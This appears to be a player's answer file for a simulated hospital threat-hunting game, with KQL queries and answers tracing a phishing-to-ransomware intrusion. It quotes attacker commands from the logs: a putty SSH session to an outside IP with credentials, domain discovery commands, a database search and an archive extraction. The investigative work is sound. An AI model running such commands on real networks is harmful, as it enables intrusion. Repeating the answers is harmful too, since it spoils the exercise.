////AzureCrest - The full version////
//Welcome to Azure Crest Hospital!
//Type "done" to earn credit for this question.
//How many employees work at Azure Crest Hospital?
search *
| distinct $table
// Employees, OutboundNetworkEvents,, AuthenticationEvents, PassiveDns, Email, InboundNetworkEvents, NetworkFlow
// ProcessEvents
// FileCreationEvents
// SecurityAlerts

Employees
| count //250

//What is the Chief Financial Officer's name?
Employees
| where role == "Chief Financial Officer"
| project name, email_addr, ip_addr //Penny Pincher

//How many emails did Penny Pincher receive?

Email
| where recipient == "penny_pincher@azurecresthospital.med"
| count //30

//How many distinct senders were seen in the email logs from pharmabest.net?
Email
| where sender contains "pharmabest.net"
| distinct sender
| count //236

//How many distinct websites did “Penny Pincher” visit?
OutboundNetworkEvents
//| take 1
| where src_ip == "10.10.0.1"
| distinct url
| count //68

//How many distinct domains in the PassiveDns records contain the word “health”?//
PassiveDns
//| take 1
| where domain contains "health"
| distinct domain
| count //28

//What IPs did the domain “bit.ly” resolve to (enter any one of them)?
PassiveDns
//| take 1
| where domain contains "bit.ly"
| distinct ip // 134.177.143.174 and 42.143.126.108

//How many distinct URLs did employees with the first name "Mary" Visit?
let mary_ips = 
Employees
| where name has "Mary"
| distinct ip_addr;
OutboundNetworkEvents
| where src_ip in (mary_ips)
| distinct url
| count //119

//How many authentication attempts did we see to the accounts of employees with the first name Mary?
let mary_ips = Employees
| where name has "Mary"
| distinct username;
AuthenticationEvents
| where username in (mary_ips)
| count //180

//Section 2: Quarantine Quandary

//We received a security alert a few days ago that a file with the word 'healthcare' was quarantined. We know that it's your first day here, but we get these alerts all the time and they are usually nothing. What could possibly go wrong?
//What is the name of the file that was quarantined?

FileCreationEvents
| where filename contains "healthcare"

// or better

SecurityAlerts
| where indicators contains "healthcare"

// filename== New_Healthcare_Protocols.docm

//Nice! You found the file! Now let's gather enough evidence for us to resolve this stupid alert and go chitchat at the water cooler.
//What is the hostname of the computer that contained this file?
SecurityAlerts
| where indicators contains "healthcare"
//'hostname': 'ZQHM-LAPTOP',

//Ok, we have the machine name, let's figure out who it belongs to.
//What is the name of the employee that this computer belongs to?

Employees
| where hostname has "ZQHM-LAPTOP"
|project name, email_addr, role, username, ip_addr
//Jerry Jones	jerry_jones@azurecresthospital.med	Resident Doctors	jejones	10.10.0.174

//Is this someone that should be reading a file like that?
//What is that employee's role at Azure Crest Hospital?
// Role == Resident Doctors

let suspicious_hosts =
SecurityAlerts
| where indicators contains "healthcare"
| extend hostname = extract("'hostname': '([^']+)'", 1, tostring(indicators))
| where isnotempty(hostname)
| distinct hostname;
Employees
| where hostname in (suspicious_hosts)
| project name, email_addr, role, username, ip_addr, hostname
// Role == Resident Doctors

//It's looking like it's nothing just like they said. A doctor was just trying to download a file related to healthcare protocols.
//When was this file created on the doctor's computer? (paste the full timestamp)
FileCreationEvents
| where hostname == "ZQHM-LAPTOP"
| where filename == "New_Healthcare_Protocols.docm"
| project timestamp

//Just to be sure, let's find out where this file came from.
//What process did we see create this file? (process name)
FileCreationEvents
| where hostname == "ZQHM-LAPTOP"
| where filename == "New_Healthcare_Protocols.docm"
| project timestamp, process_name

//That means the file was downloaded from the internet!
//What domain was the file downloaded from?

OutboundNetworkEvents
|where src_ip == "10.10.0.174"
| where url contains "New_Healthcare_Protocols"
| project timestamp, url //takeyatimecarepartners.com
//http://takeyatimecarepartners.com/images/images/files/New_Healthcare_Protocols.docm

//Sneaky! Sneaky! That sounds a lot like a legitimate partner domain.
//Which legitimate Azure Crest partner's domain is the threat actor attempting to mimic?
//'hostname': 'ZQHM-LAPTOP'

OutboundNetworkEvents
|where src_ip == "10.10.0.174"
| where url contains "carepartner"
///https://emergencycarepartners.sharepoint.com/1qtPCLHD2DQLlekpaxvj/?items=978-1-217-66441-4/tEMF-309289324
// we have emergencycarepartners.sharepoint.com it is the actor mimicing emergencycarepartners.com
//Response emergencycarepartners.com

//Ok the file came from a shady looking domain, but why the heck did the user download it? It's possible they downloaded the file via a link in an email.
//Let's try to find that email.
//What is Jerry's email address?

Employees
| where hostname has "ZQHM-LAPTOP"
|project name, email_addr, role, username, ip_addr
//Jerry Jones	jerry_jones@azurecresthospital.med	Resident Doctors	jejones	10.10.0.174

//How many emails did Jerry Jones receive?
Email
| where recipient == "jerry_jones@azurecresthospital.med"
| count //23

//When did Jerry receive the email that contained a link to the quarantined file? (paste the full timestamp)

//*** quarantinde file  ==  New_Healthcare_Protocols.docm
Email
| where recipient == "jerry_jones@azurecresthospital.med"
| where link contains "New_Healthcare_Protocols.docm" 
//2024-03-14T10:27:39.000Z

//What is the sender's address for that email?
// sender== medstaffinfo@hospitalcomm.org

//What 'reply to' address is used?
//healthupdate@gmail.com

//What is the subject of the email?
//[EXTERNAL] FW: 🚑 Attention Required: Urgent Pediatric Health Procedure Update

//It looks like Jerry received another email from this sender.
//When did Jerry receive that email? (paste the full timestamp)
// sender== medstaffinfo@hospitalcomm.org
// reply to healthupdate@gmail.com
Email
| where recipient == "jerry_jones@azurecresthospital.med" and sender contains "healthupdate@gmail.com"
//2024-03-14T10:27:39.000Z
//What is filename seen in the link? Pediatric_Care_Update.docm
//https://medequipamateurs.org/modules/online/modules/Pediatric_Care_Update.docm

//The following news just dropped about the happenings at Azure Crest. Apparently, the doctors are having trouble accessing any database systems, and have leaked these frustrations to the press. You've been so deep in your investigation that you didn't notice.
//The IT director bursts into your office demanding answers. The C-suite is asking him how this could possibly have happened.

// Section 3: The Phisher's Net/////

//How many Azure Crest employees received emails containing a link to the previously identified (.docm) files?
Email
| where link contains ".docm"
| distinct recipient //40

//How many distinct subjects did the threat actors use in this batch of emails?
Email
| where link contains ".docm"
| project subject //7

//How many distinct links did the threat actors use in this batch of emails?
Email
| where link contains ".docm"
| distinct link //17

//How many distinct domains were used in this batch of emails?//
Email
| where link contains ".docm"
| parse link with "https://" domain "/" * //4
| distinct domain //unhealthyrecordsystems.tech, medequipamateurs.org, takeyatimecarepartners.com, pharmasecondbest.net

//Alright, we know the threat actor sent a lot of emails our way. We want to know if they had any success. If we are lucky, everyone will have recalled their cyberawareness training, and no one will have clicked on these shady links.

//How many employees clicked on the email links?

Email
| where link contains ".docm"
| take 1


OutboundNetworkEvents
| getschema


Email
| where link contains ".docm"
| where recipient contains "@azurecresthospital.med"
| join kind=inner (
    Employees
) on $left.recipient == $right.email_addr
| join kind=inner (
    OutboundNetworkEvents
    | where url contains ".docm"
) on $left.ip_addr == $right.src_ip
| summarize ClickedEmployees = dcount(recipient) //37

//How many records are there for either of these files being on Azure Crest employee computers?
FileCreationEvents
| where filename contains ".docm" //38

//What is the timestamp for the first time one of these files was created?

FileCreationEvents
| where filename contains ".docm" //38
| summarize FirstCreated = min(timestamp), TotalRecords = count() //2024-03-01T11:58:33.000Z

//What is the name of the file that is created after the suspicious file is downloaded?
FileCreationEvents
| where timestamp >= datetime(2024-03-01 11:58)
|take 10 // C:\ProgramData\Heartburn\heartburn.zip Filename== heartburn.zip

//What is the directory path that contains this new file?
//C:\ProgramData\Heartburn\

//On that machine, how many additional files are created in the same directory?
FileCreationEvents
| where timestamp >= datetime(2024-03-01 11:58)
| where hostname == "P3EX-DESKTOP"
| where path contains "Heartburn" //anydesk.exe, putty.exe, secretsdump.exe

//What command was used to extract the additional files from the zip file into the same directory where it was located?

ProcessEvents
| where process_commandline contains "heartburn.zip"
//cmd.exe /c Expand-Archive -Path C: \ProgramData\heartburn.zip -DestinationPath C:\ProgramData\Heartburn

//What is the IP address that putty.exe uses to establish it's SSH connection?
ProcessEvents
| where hostname == "P3EX-DESKTOP"
| where process_commandline contains "putty.exe"
//cmd.exe /c C:\ProgramData\Heartburn\putty.exe -ssh 93.142.203.80 -l have_ya_tried -pw turning_it_off_and_on_again
//93.142.203.80

//What does the acronym SSH stand for? 
//secure shell

//How many unique IP addresses were used to initiate similar SSH connections?
ProcessEvents
//| where process_commandline contains "SSH"
| parse process_commandline with "-ssh" ip "-l"*
| distinct ip //17 ip

//What username is used to initiate the SSH connection?
ProcessEvents
| where process_commandline contains "SSH"
| take 1 //have_ya_tried is the username used (-l)

//What is the password used to initiate the SSH connection?
ProcessEvents
| where process_commandline contains "SSH"
| take 1 //turning_it_off_and_on_again password used (-pw)

//Discovery commands are often run by an attacker to collect information about the target system or network.
//How many of these commands were run on the victim's computer?
ProcessEvents
| where hostname == "P3EX-DESKTOP"
| where process_commandline !contains "C:" and  process_commandline !contains ".exe"
| distinct process_commandline // 5 : whoami, net user /domain, net group "domain computers" /domain, net group "domain admins" /domain, net localgroup administrators

//Just as you're about to continue investigating, the sweaty and very flustered IT Director barges in with an urgent tone, firing off questions:
//"Wait a minute! Is it over yet? People keep asking me questions! Have you found who is responsible yet? Are they still in the network? What's taking so long? Is it the darkweb cybercriminals? I heard about darkweb cybercriminal hackers targeting healthcare companies. How many of our employee computers have been hacked? How bad is it?”
//You inwardly sigh knowing you'll need to address the Director's most immediate concern before you can finish your investigation.


//How many of our employee computers have been compromised?

ProcessEvents
| where process_commandline contains "heartburn.zip"
| distinct username //35

//This Twitter user, also known as "Hutch", co-authored the paper that introduced the Cyber Kill Chain to information security. (enter their @ username)
//The Cyber Kill Chain was introduced by Lockheed Martin in 2011. The co-authors were Mike Cloppert and Eric Hutchins.
//Eric Hutchins is known as "Hutch" on Twitter/X:
// Response: @killchain

//The seven steps of the Cyber Kill Chain enhance visibility into an attack and enrich an analyst’s understanding of an adversary’s tactics, techniques and procedures.
// Reconnaissance

//Let's dive deeper into the threat actor's initial reconnaissance efforts to better understand what the attacker was seeking.
//How many records are there of the threat actor browsing the Azure Crest Hospital's website?


OutboundNetworkEvents
| getschema

ProcessEvents
//| where process_commandline contains "SSH"
| parse process_commandline with "-ssh" ip "-l"*
| distinct ip //17 ip

// the threat actor use all these 17 IP
// 17 IP ("102.51.252.158", "115.12.60.150", "131.190.102.173", "131.92.62.82", "135.103.59.74", "16.101.245.182", "195.112.237.95", "195.34.207.83", "204.51.179.34", "206.14.86.187", "215.95.144.58", "25.126.98.121", "62.121.133.43", "7.125.34.183", "71.64.91.134", "93.142.203.80", "96.120.124.180")

InboundNetworkEvents
| where url contains "azurecresthospital"
| where src_ip in ("102.51.252.158", "115.12.60.150", "131.190.102.173", "131.92.62.82", "135.103.59.74", "16.101.245.182", "195.112.237.95", "195.34.207.83", "204.51.179.34", "206.14.86.187", "215.95.144.58", "25.126.98.121", "62.121.133.43", "7.125.34.183", "71.64.91.134", "93.142.203.80", "96.120.124.180")
| count //32

// Another reasonning, we check distink user_agent
InboundNetworkEvents
| where url contains "azurecresthospital"
| parse user_agent with user_agent2 "/"*
| distinct user_agent2
// we have Opera and Mozilla (mozilla is the useragent used by the company, so the thraeat actor use Opera)

InboundNetworkEvents
| where url contains "azurecresthospital"
| parse user_agent with user_agent2 "/"*
| where user_agent2 contains "opera"
|count 

//The threat actor apparently learned A LOT from doing research on Azure Crest's website. First they found about some major personnel changes at the hospital.
//These changes came as part of the CFO's promise to save money.
//What article did they read about personnel changes at the hospital? (provide full url)
InboundNetworkEvents
| where src_ip in ("102.51.252.158", "115.12.60.150", "131.190.102.173", "131.92.62.82", "135.103.59.74", "16.101.245.182", "195.112.237.95", "195.34.207.83", "204.51.179.34", "206.14.86.187", "215.95.144.58", "25.126.98.121", "62.121.133.43", "7.125.34.183", "71.64.91.134", "93.142.203.80", "96.120.124.180")
| where url contains "azurecresthospital"
//https://azurecresthospital.med/news/half-of-it-department-fired

//Following the personnel changes, Azure Crest's CFO hired her buddy to fill in the gaps.
//Which employee was hired as part of an effort to reduce costs?
InboundNetworkEvents
| where src_ip in ("102.51.252.158", "115.12.60.150", "131.190.102.173", "131.92.62.82", "135.103.59.74", "16.101.245.182", "195.112.237.95", "195.34.207.83", "204.51.179.34", "206.14.86.187", "215.95.144.58", "25.126.98.121", "62.121.133.43", "7.125.34.183", "71.64.91.134", "93.142.203.80", "96.120.124.180")
| where url contains "azurecresthospital"

// https://azurecresthospital.med/news/roy-trenemman-joins-azure-crest-to-save-money-on-erp-systems

Employees
| where name contains "roy"
// Response Roy Trenneman Database Administrator

//This new employee went right to work on figuring out how to save money. His suggestion, touted and published as research on the Azure Crest Hospital website, was to have Azure Crest bring their technology in-house.
//Narrator Note: It was actually a VERY BAD idea
//What article did Azure Crest publish about building one's own stuff instead of paying for it? (provide the full url)
InboundNetworkEvents
| where src_ip in ("102.51.252.158", "115.12.60.150", "131.190.102.173", "131.92.62.82", "135.103.59.74", "16.101.245.182", "195.112.237.95", "195.34.207.83", "204.51.179.34", "206.14.86.187", "215.95.144.58", "25.126.98.121", "62.121.133.43", "7.125.34.183", "71.64.91.134", "93.142.203.80", "96.120.124.180")
| where url contains "azurecresthospital"
//https://azurecresthospital.med/news/research/why-pay-for-expensive-erp-systems-when-you-can-run-your-own

//What specific type of medical records was the Threat Actor attempting to access on Azure Crest Hospital’s internal share?
InboundNetworkEvents
| where src_ip in ("102.51.252.158", "115.12.60.150", "131.190.102.173", "131.92.62.82", "135.103.59.74", "16.101.245.182", "195.112.237.95", "195.34.207.83", "204.51.179.34", "206.14.86.187", "215.95.144.58", "25.126.98.121", "62.121.133.43", "7.125.34.183", "71.64.91.134", "93.142.203.80", "96.120.124.180")
| where url contains "azurecresthospital" and url contains "share"
//Response: pediatric

//After researching two employees at Azure Crest Hospital, the threat actor focused their efforts on one employee in particular.
//Which employee did the threat actor ultimately decide to target?
InboundNetworkEvents
| where src_ip in ("102.51.252.158", "115.12.60.150", "131.190.102.173", "131.92.62.82", "135.103.59.74", "16.101.245.182", "195.112.237.95", "195.34.207.83", "204.51.179.34", "206.14.86.187", "215.95.144.58", "25.126.98.121", "62.121.133.43", "7.125.34.183", "71.64.91.134", "93.142.203.80", "96.120.124.180")
| where url contains "azurecresthospital"
//Response: Roy Trenneman

//What is that employee's role?
Employees
| where name contains "roy trenneman"
// Response Roy Trenneman Database Administrator, roy_trenneman@azurecresthospital.med, SUPER-DB-SERVER-9000, rotrenneman

//What is the timestamp of the email that the threat actor sent to that employee?
//the threat actor Email is healthupdate@gmail.com
Email
| where sender=="healthupdate@gmail.com" and recipient =="roy_trenneman@azurecresthospital.med"
//resp : 2024-03-04T10:52:18.000Z ; link http://unhealthyrecordsystems.tech/images/images/New_Healthcare_Protocols.docm

Email
| where link contains "http://unhealthyrecordsystems.tech/images/images/New_Healthcare_Protocols.docm"
| where recipient contains "roy_trenneman@azurecresthospital.med"
| join kind=inner (
    Employees
) on $left.recipient == $right.email_addr
| join kind=inner (
    OutboundNetworkEvents
    | where url contains "http://unhealthyrecordsystems.tech/images/images/New_Healthcare_Protocols.docm"
) on $left.ip_addr == $right.src_ip
//| summarize ClickedEmployees = dcount(recipient) 
// Response yes

//What is the timestamp for when the docm file was created on Roy's machine?
Employees
| where name contains "roy trenneman"
//Hostname==SUPER-DB-SERVER-9000

FileCreationEvents
| where hostname =="SUPER-DB-SERVER-9000"
| where filename contains "New_Healthcare_Protocols.docm" //2024-03-04T11:28:57.000Z

//What is the name of the first malicious file created by the threat actor in the user's Temp folder?
FileCreationEvents
| where hostname =="SUPER-DB-SERVER-9000"
| where path contains "Temp"
//dbhunter.exe

//What types of files does dbhunter.exe search for upon execution? (enter any one of them)
ProcessEvents
| where process_name == "dbhunter.exe"
| project timestamp, process_commandline
| order by timestamp asc
//dbhunter.exe --search --filetype .db .sql .mdb --output C:\\In\\found_databases.txt

//After compressing a series of files for exfiltration, the threat actor secures them with a password.
//What password is used to encrypt the compressed file containing Roy's meme collection?

ProcessEvents
| where process_commandline contains "meme"
| project timestamp, process_commandline
| order by timestamp asc //look for flags like -p, --password, or -pass
//response == mommawemadeit

//The execution of UrTottalyPwned.bat triggers the encryption of database files.
//What extension has been added to the files to indicate that they have been encrypted?

FileCreationEvents
| where filename contains "UrTottalyPwned"
// file creation at 2024-04-02T11:29:37.000Z

ProcessEvents
| where process_commandline contains "UrTottalyPwned.bat"
// command executed at timestamp == 2024-04-02T11:31:47.000Z

// check file creation with | where hostname =="SUPER-DB-SERVER-9000"
FileCreationEvents
| where hostname =="SUPER-DB-SERVER-9000"
| where timestamp >= datetime(2024-04-02 11:29)
| take 10  
// Response extension .scholopendra

//A command was executed to modify registry settings, altering the desktop wallpaper for all user profiles. This change indicates that the files throughout the database had been encrypted by the threat actor.
//What is the name of the new wallpaper?

ProcessEvents
| where hostname == "SUPER-DB-SERVER-9000"
| where process_commandline contains "wallpaper"
| project timestamp, process_commandline
| order by timestamp asc
// The wallpaper filename will be visible in the registry command — look for something like reg add ... /v Wallpaper /t REG_SZ /d "C:\path\to\wallpaper.jpg"
//respnse == ItWentWrong.jpg

